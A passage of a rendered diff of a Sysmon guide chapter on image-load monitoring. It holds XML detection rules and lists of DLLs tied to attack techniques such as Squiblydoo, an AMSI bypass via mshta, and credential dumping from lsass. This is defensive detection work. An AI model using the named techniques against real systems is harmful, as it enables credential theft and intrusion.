+<li><strong>msxml3.dll</strong> and <strong>msxml6.dll</strong> - XML parsing (used in some script-based attacks)</li>
+</ul>
+<p dir="auto"><strong>Credential Access:</strong></p>
+<ul dir="auto">
+<li><strong>samlib.dll</strong> - Security Accounts Manager library (credential dumping)</li>
+<li><strong>vaultcli.dll</strong> - Windows Vault access (credential theft)</li>
+<li><strong>wdigest.dll</strong> - WDigest authentication (credential access)</li>
+</ul>
+<p dir="auto"><strong>Injection and Debugging:</strong></p>
+<ul dir="auto">
+<li><strong>dbghelp.dll</strong> and <strong>dbgcore.dll</strong> - Debugging libraries (process dumping, credential theft)</li>
+<li><strong>ntdll.dll</strong> loaded from unusual paths - Core system DLL from non-system location (DLL hijacking)</li>
+</ul>
+<p dir="auto"><strong>Suspicious DLL Characteristics to Monitor:</strong></p>
+<ul dir="auto">
+<li>Unsigned DLLs loaded into signed processes</li>
+<li>DLLs loaded from user-writable directories (C:\Users\<em>, C:\ProgramData\</em>, C:\Windows\Temp\*)</li>
+<li>DLLs with suspicious names or no metadata</li>
+<li>Known malicious DLL hashes from threat intelligence</li>
+</ul>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Configuration Examples</h2><a id="user-content-configuration-examples" class="anchor" aria-label="Permalink: Configuration Examples" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#configuration-examples"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto"><strong>Example 1: Script Engine Detection</strong></p>
+<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto"><pre>&lt;<span class="pl-ent">Sysmon</span> <span class="pl-e">schemaversion</span>=<span class="pl-s"><span class="pl-pds">"</span>4.22<span class="pl-pds">"</span></span>&gt;
+    &lt;<span class="pl-ent">EventFiltering</span>&gt;
+        &lt;<span class="pl-ent">RuleGroup</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>or<span class="pl-pds">"</span></span>&gt;
+            &lt;<span class="pl-ent">ImageLoad</span> <span class="pl-e">onmatch</span>=<span class="pl-s"><span class="pl-pds">"</span>include<span class="pl-pds">"</span></span>&gt;
+                <span class="pl-c"><span class="pl-c">&lt;!--</span>Detect execution of HTA using the IE Javascript engine to bypass AMSI<span class="pl-c">--&gt;</span></span>
+                <span class="pl-c"><span class="pl-c">&lt;!--</span>Note: Rule placed before Windows Scriptingh to ensure it triggers on this on case any other component is used.<span class="pl-c">--&gt;</span></span>
+                &lt;<span class="pl-ent">Rule</span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>and<span class="pl-pds">"</span></span>&gt;
+                    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>technique_id=T1170,technique_name=MSHTA with AMSI Bypass<span class="pl-pds">"</span></span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;jscript9.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+                    &lt;<span class="pl-ent">Image</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;mshta.exe&lt;/<span class="pl-ent">Image</span>&gt;
+                &lt;/<span class="pl-ent">Rule</span>&gt;
+                <span class="pl-c"><span class="pl-c">&lt;!--</span>Capture components used by malicious macros and scripts.<span class="pl-c">--&gt;</span></span>
+                &lt;<span class="pl-ent">Rule</span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>or<span class="pl-pds">"</span></span>&gt;
+                    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>technique_id=T1064,technique_name=Windows Scripting Host Component<span class="pl-pds">"</span></span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;wshom.ocx&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+                    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;scrrun.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+                    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;vbscript.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+                &lt;/<span class="pl-ent">Rule</span>&gt;
+                <span class="pl-c"><span class="pl-c">&lt;!--</span>Check for loading of the PowerShell engine<span class="pl-c">--&gt;</span></span>
+                &lt;<span class="pl-ent">Rule</span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>or<span class="pl-pds">"</span></span>&gt;
+                    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>technique_id=T1086,technique_name=PowerShell Engine<span class="pl-pds">"</span></span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;System.Management.Automation.ni.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+                    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;System.Management.Automation.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+                &lt;/<span class="pl-ent">Rule</span>&gt;
+                <span class="pl-c"><span class="pl-c">&lt;!--</span>Detect the Squiblydoo technique<span class="pl-c">--&gt;</span></span>
+                &lt;<span class="pl-ent">Rule</span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>or<span class="pl-pds">"</span></span>&gt;
+                    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>technique_id=T1117,technique_name=Regsvr32<span class="pl-pds">"</span></span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;scrobj.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+                &lt;/<span class="pl-ent">Rule</span>&gt;
+            &lt;/<span class="pl-ent">ImageLoad</span>&gt;
+        &lt;/<span class="pl-ent">RuleGroup</span>&gt;
+    &lt;/<span class="pl-ent">EventFiltering</span>&gt;
+&lt;/<span class="pl-ent">Sysmon</span>&gt;</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<Sysmon schemaversion=&quot;4.22&quot;>
+    <EventFiltering>
+        <RuleGroup name=&quot;&quot; groupRelation=&quot;or&quot;>
+            <ImageLoad onmatch=&quot;include&quot;>
+                <!--Detect execution of HTA using the IE Javascript engine to bypass AMSI-->
+                <!--Note: Rule placed before Windows Scriptingh to ensure it triggers on this on case any other component is used.-->
+                <Rule groupRelation=&quot;and&quot;>
+                    <ImageLoaded name=&quot;technique_id=T1170,technique_name=MSHTA with AMSI Bypass&quot; condition=&quot;end with&quot;>jscript9.dll</ImageLoaded>
+                    <Image condition=&quot;end with&quot;>mshta.exe</Image>
+                </Rule>
+                <!--Capture components used by malicious macros and scripts.-->
+                <Rule groupRelation=&quot;or&quot;>
+                    <ImageLoaded name=&quot;technique_id=T1064,technique_name=Windows Scripting Host Component&quot; condition=&quot;end with&quot;>wshom.ocx</ImageLoaded>
+                    <ImageLoaded condition=&quot;end with&quot;>scrrun.dll</ImageLoaded>
+                    <ImageLoaded condition=&quot;end with&quot;>vbscript.dll</ImageLoaded>
+                </Rule>
+                <!--Check for loading of the PowerShell engine-->
+                <Rule groupRelation=&quot;or&quot;>
+                    <ImageLoaded name=&quot;technique_id=T1086,technique_name=PowerShell Engine&quot; condition=&quot;end with&quot;>System.Management.Automation.ni.dll</ImageLoaded>
+                    <ImageLoaded condition=&quot;end with&quot;>System.Management.Automation.dll</ImageLoaded>
+                </Rule>
+                <!--Detect the Squiblydoo technique-->
+                <Rule groupRelation=&quot;or&quot;>
+                    <ImageLoaded name=&quot;technique_id=T1117,technique_name=Regsvr32&quot; condition=&quot;end with&quot;>scrobj.dll</ImageLoaded>
+                </Rule>
+            </ImageLoad>
+        </RuleGroup>
+    </EventFiltering>
+</Sysmon>" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto"><strong>Example 2: Detecting Unsigned DLLs in Sensitive Processes</strong></p>
+<p dir="auto">Monitor for unsigned libraries loaded into critical system processes:</p>
+<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto"><pre>&lt;<span class="pl-ent">ImageLoad</span> <span class="pl-e">onmatch</span>=<span class="pl-s"><span class="pl-pds">"</span>include<span class="pl-pds">"</span></span>&gt;
+  &lt;<span class="pl-ent">Rule</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>UnsignedDLLInSystemProcess<span class="pl-pds">"</span></span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>and<span class="pl-pds">"</span></span>&gt;
+    &lt;<span class="pl-ent">Image</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>is<span class="pl-pds">"</span></span>&gt;C:\Windows\System32\lsass.exe&lt;/<span class="pl-ent">Image</span>&gt;
+    &lt;<span class="pl-ent">Signed</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>is<span class="pl-pds">"</span></span>&gt;false&lt;/<span class="pl-ent">Signed</span>&gt;
+  &lt;/<span class="pl-ent">Rule</span>&gt;
+  &lt;<span class="pl-ent">Rule</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>UnsignedDLLInExplorer<span class="pl-pds">"</span></span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>and<span class="pl-pds">"</span></span>&gt;
+    &lt;<span class="pl-ent">Image</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>is<span class="pl-pds">"</span></span>&gt;C:\Windows\explorer.exe&lt;/<span class="pl-ent">Image</span>&gt;
+    &lt;<span class="pl-ent">Signed</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>is<span class="pl-pds">"</span></span>&gt;false&lt;/<span class="pl-ent">Signed</span>&gt;
+  &lt;/<span class="pl-ent">Rule</span>&gt;
+&lt;/<span class="pl-ent">ImageLoad</span>&gt;</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<ImageLoad onmatch=&quot;include&quot;>
+  <Rule name=&quot;UnsignedDLLInSystemProcess&quot; groupRelation=&quot;and&quot;>
+    <Image condition=&quot;is&quot;>C:\Windows\System32\lsass.exe</Image>
+    <Signed condition=&quot;is&quot;>false</Signed>
+  </Rule>
+  <Rule name=&quot;UnsignedDLLInExplorer&quot; groupRelation=&quot;and&quot;>
+    <Image condition=&quot;is&quot;>C:\Windows\explorer.exe</Image>
+    <Signed condition=&quot;is&quot;>false</Signed>
+  </Rule>
+</ImageLoad>" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto"><strong>Example 3: DLL Loading from Suspicious Paths</strong></p>
+<p dir="auto">Detect DLLs loaded from user-writable or temporary directories:</p>
+<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto"><pre>&lt;<span class="pl-ent">ImageLoad</span> <span class="pl-e">onmatch</span>=<span class="pl-s"><span class="pl-pds">"</span>include<span class="pl-pds">"</span></span>&gt;
+  &lt;<span class="pl-ent">Rule</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>DLLFromTempDirectory<span class="pl-pds">"</span></span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>or<span class="pl-pds">"</span></span>&gt;
+    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>begin with<span class="pl-pds">"</span></span>&gt;C:\Users\&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>begin with<span class="pl-pds">"</span></span>&gt;C:\Windows\Temp\&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>begin with<span class="pl-pds">"</span></span>&gt;C:\ProgramData\&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+  &lt;/<span class="pl-ent">Rule</span>&gt;
+&lt;/<span class="pl-ent">ImageLoad</span>&gt;</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<ImageLoad onmatch=&quot;include&quot;>
+  <Rule name=&quot;DLLFromTempDirectory&quot; groupRelation=&quot;or&quot;>
+    <ImageLoaded condition=&quot;begin with&quot;>C:\Users\</ImageLoaded>
+    <ImageLoaded condition=&quot;begin with&quot;>C:\Windows\Temp\</ImageLoaded>
+    <ImageLoaded condition=&quot;begin with&quot;>C:\ProgramData\</ImageLoaded>
+  </Rule>
+</ImageLoad>" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto"><strong>Example 4: Credential Access DLL Monitoring</strong></p>
+<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto"><pre>&lt;<span class="pl-ent">ImageLoad</span> <span class="pl-e">onmatch</span>=<span class="pl-s"><span class="pl-pds">"</span>include<span class="pl-pds">"</span></span>&gt;
+  &lt;<span class="pl-ent">Rule</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>CredentialAccessDLLs<span class="pl-pds">"</span></span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>or<span class="pl-pds">"</span></span>&gt;
+    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;samlib.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;vaultcli.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+    &lt;<span class="pl-ent">ImageLoaded</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>end with<span class="pl-pds">"</span></span>&gt;wdigest.dll&lt;/<span class="pl-ent">ImageLoaded</span>&gt;
+  &lt;/<span class="pl-ent">Rule</span>&gt;
+&lt;/<span class="pl-ent">ImageLoad</span>&gt;</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<ImageLoad onmatch=&quot;include&quot;>
+  <Rule name=&quot;CredentialAccessDLLs&quot; groupRelation=&quot;or&quot;>
+    <ImageLoaded condition=&quot;end with&quot;>samlib.dll</ImageLoaded>
+    <ImageLoaded condition=&quot;end with&quot;>vaultcli.dll</ImageLoaded>
+    <ImageLoaded condition=&quot;end with&quot;>wdigest.dll</ImageLoaded>
+  </Rule>
+</ImageLoad>" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">What to Investigate</h2><a id="user-content-what-to-investigate" class="anchor" aria-label="Permalink: What to Investigate" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#what-to-investigate"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">When reviewing image load events, prioritize these patterns:</p>
+<p dir="auto"><strong>1. PowerShell Engine Loaded by Non-PowerShell Processes</strong></p>
+<ul dir="auto">
+<li>System.Management.Automation.dll loaded by Excel, Word, or other Office applications (malicious macro)</li>
+<li>PowerShell DLL loaded by rundll32.exe, regsvr32.exe, or other LOLBins</li>
+<li>PowerShell loaded by unknown or suspicious processes</li>
+</ul>
+<p dir="auto"><strong>2. Script Engines in Office Applications</strong></p>
+<ul dir="auto">
+<li>vbscript.dll, jscript.dll, or wshom.ocx loaded by WINWORD.EXE or EXCEL.EXE (macros or embedded scripts)</li>
+<li>scrrun.dll providing file system access from documents</li>
+</ul>
+<p dir="auto"><strong>3. Squiblydoo and COM Abuse</strong></p>
+<ul dir="auto">
+<li>scrobj.dll loaded by regsvr32.exe (classic Squiblydoo)</li>
+<li>Unexpected processes loading COM or ActiveX components</li>
+</ul>
+<p dir="auto"><strong>4. DLL Hijacking Indicators</strong></p>
+<ul dir="auto">
+<li>System DLLs (ntdll.dll, kernel32.dll, etc.) loaded from non-system paths</li>
+<li>DLLs with names similar to system DLLs but from user directories</li>
+</ul>
+<p dir="auto"><strong>5. Debugging DLLs Against Critical Processes</strong></p>
+<ul dir="auto">
+<li>dbghelp.dll or dbgcore.dll loaded into lsass.exe or other sensitive processes</li>
+<li>Correlation with Process Access events for comprehensive credential dumping detection</li>
+</ul>
+<p dir="auto"><strong>6. Unsigned or Suspicious DLLs</strong></p>
+<ul dir="auto">
+<li>Unsigned DLLs loaded into signed processes (potential injection)</li>
+<li>DLLs from temporary directories or download folders</li>
+<li>DLLs with no version information or metadata</li>
+</ul>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Common False Positives and Mitigation</h2><a id="user-content-common-false-positives-and-mitigation" class="anchor" aria-label="Permalink: Common False Positives and Mitigation" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#common-false-positives-and-mitigation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Even with targeted includes, some false positives may occur:</p>
+<p dir="auto"><strong>Legitimate PowerShell Usage</strong>: Some enterprise software legitimately uses PowerShell engine DLLs. Document these and create specific exclusions for known-good processes with full path verification.</p>
+<p dir="auto"><strong>Development Environments</strong>: Visual Studio and development tools load many scripting engines and components. Consider excluding developer workstations or specific development tool paths.</p>
+<p dir="auto"><strong>Management Software</strong>: Configuration management tools, monitoring agents, and administrative software may load scripting engines. Whitelist by full path and signature.</p>
+<p dir="auto"><strong>Third-Party Software</strong>: Some commercial applications use embedded scripting. Baseline your environment to identify legitimate uses.</p>
+<p dir="auto"><strong>Mitigation Strategy</strong>:</p>
+<ul dir="auto">
+<li>Combine multiple criteria (process + DLL + signature status + path)</li>
+<li>Use exclusions sparingly and with full path verification</li>
+<li>Document all exclusions and review quarterly</li>
+<li>Prefer SIEM-level filtering for known-good over Sysmon exclusions</li>
+</ul>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Performance Considerations</h2><a id="user-content-performance-considerations" class="anchor" aria-label="Permalink: Performance Considerations" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#performance-considerations"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Image loading can impact system performance if misconfigured:</p>
+<p dir="auto"><strong>Minimize Monitored DLLs</strong>: Only monitor DLLs with proven detection value. Resist the urge to add every interesting DLL.</p>
+<p dir="auto"><strong>Avoid Wildcards</strong>: Wildcards in ImageLoaded filters can match many DLLs. Be specific.</p>
+<p dir="auto"><strong>Disable on High-Load Systems</strong>: Consider disabling image load monitoring on extremely busy servers (web servers, databases) and focusing on workstations and sensitive servers.</p>
+<p dir="auto"><strong>Test Before Deployment</strong>: Deploy image load configurations to a small test group first and monitor Sysmon CPU usage and event volume.</p>
+<p dir="auto"><strong>Use Signature Checking Wisely</strong>: Checking signatures adds processing overhead. Use signature filters only when necessary.</p>
